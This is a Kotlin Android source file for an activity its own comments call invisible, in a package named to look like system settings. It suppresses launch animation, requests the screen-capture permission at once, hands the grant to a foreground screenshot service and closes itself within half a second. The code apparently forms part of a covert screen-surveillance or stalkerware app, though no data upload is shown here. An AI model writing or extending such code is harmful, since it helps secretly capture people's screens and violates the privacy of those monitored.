package com.settings.info

import android.app.Activity
import android.content.Intent
import android.media.projection.MediaProjectionManager
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log

/**
 * Invisible activity that requests and starts the screenshot service
 */
class MainActivity : Activity() {
    private val TAG = "MainActivity"
    private val SCREENSHOT_REQUEST_CODE = 1001
    private lateinit var mediaProjectionManager: MediaProjectionManager
    
    companion object {
        const val PREF_INITIAL_SETUP_DONE = "initial_setup_done"
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Set overridePendingTransition to 0,0 to avoid any animation when this activity starts
        overridePendingTransition(0, 0)
        
        try {
            // Initialize storage
            StorageManager.initialize(applicationContext)
            
            // Get MediaProjectionManager
            mediaProjectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            
            // Request screenshot permission immediately
            requestScreenshotPermission()
        } catch (e: Exception) {
            Log.e(TAG, "Error in onCreate", e)
            finish()
        }
    }
    
    private fun requestScreenshotPermission() {
        try {
            Log.d(TAG, "Requesting screenshot permission")
            val intent = mediaProjectionManager.createScreenCaptureIntent()
            startActivityForResult(intent, SCREENSHOT_REQUEST_CODE)
        } catch (e: Exception) {
            Log.e(TAG, "Error requesting screenshot permission", e)
            finish()
        }
    }
    
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        
        if (requestCode == SCREENSHOT_REQUEST_CODE) {
            if (resultCode == RESULT_OK && data != null) {
                Log.d(TAG, "Screenshot permission granted!")
                
                // Mark setup as done
                getSharedPreferences("app_settings", MODE_PRIVATE).edit()
                    .putBoolean(PREF_INITIAL_SETUP_DONE, true)
                    .apply()
                
                // Start the screenshot service with the projection data
                val serviceIntent = Intent(this, ScreenshotService::class.java)
                serviceIntent.putExtra("resultCode", resultCode)
                serviceIntent.putExtra("data", data)
                startForegroundService(serviceIntent)
                
                Log.d(TAG, "Screenshot service started with projection data")
            } else {
                Log.e(TAG, "Screenshot permission denied or canceled")
            }
            
            // Finish the activity regardless of result
            Handler(Looper.getMainLooper()).postDelayed({ finish() }, 500)
        }
    }
}
